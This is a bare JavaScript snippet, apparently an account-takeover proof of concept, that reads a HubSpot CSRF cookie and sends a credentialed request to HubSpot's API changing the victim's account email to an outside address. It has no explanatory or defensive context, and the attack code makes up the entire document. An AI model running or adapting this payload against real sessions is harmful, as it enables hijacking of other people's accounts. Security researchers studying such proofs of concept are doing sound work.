function getCookie(cookieName) {
  let cookie = {};
  document.cookie.split(';').forEach(function(el) {
    let [key,value] = el.split('=');
    cookie[key.trim()] = value;
  })
  return cookie[cookieName];
}

var csrf = getCookie("hubspotapi-csrf")

var xhr = new XMLHttpRequest();
xhr.open("POST", "https:\/\/api-eu1.hubspot.com\/userpreferences\/v1\/emailAddresses\/edit\/vogabod888@host1s.com?portalId=25502480&clienttimeout=14000&hs_static_app=settings-ui-security&hs_static_app_version=1.3229", true);
xhr.setRequestHeader("accept", "application\/json, text\/javascript, *\/*; q=0.01");
xhr.setRequestHeader("accept-language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
xhr.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", "B6C1X6mjRirkYRvyU8N_xg")
xhr.withCredentials = true;
var body = "";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
      aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));
